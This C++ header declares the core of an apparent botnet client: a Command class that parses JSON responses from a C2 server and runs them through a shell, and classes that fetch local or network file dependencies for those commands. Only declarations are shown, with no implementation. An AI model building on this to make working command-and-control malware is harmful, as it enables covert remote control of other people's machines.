#ifndef BOT_HH
#define BOT_HH

#include <experimental/filesystem>
#include <iostream>
#include <json.hpp>
#include <memory>
#include <string>

#include "installer.hh"
#include "request.hh"
#include "sysinfo.hh"
#include "util.hh"

namespace fs = std::experimental::filesystem;
using json = nlohmann::json;

// Base class for dependency files required by Command instances as specified by
// C2 server response
struct CommandDependency {
    CommandDependency(const std::string& name, const std::string& path) {
        this->name = name;
        this->path = path;
    }
    virtual ~CommandDependency() = default;
    std::string name;
    std::string path;
    virtual bool Retrieve() = 0;
};

// For files on local filesystem
struct LocalFileDep : public CommandDependency {
    LocalFileDep(const std::string& name, const std::string& path)
        : CommandDependency(name, path) {}
    bool Retrieve();
};

// For network files
struct NetworkFileDep : public CommandDependency {
    NetworkFileDep(const std::string& name, const std::string& path)
        : CommandDependency(name, path) {}
    bool Retrieve();
};

/* Parses JSON response from C2 server and executes that command */
class Command {
   public:
    Command(const std::string& c2_response);
    std::string Execute();

    std::string command_text;
    std::string shell;

   private:
    void ParseFileDeps_(const json& file_deps);
    std::vector<std::unique_ptr<CommandDependency>> command_deps_;
};

#endif  // BOT_HH
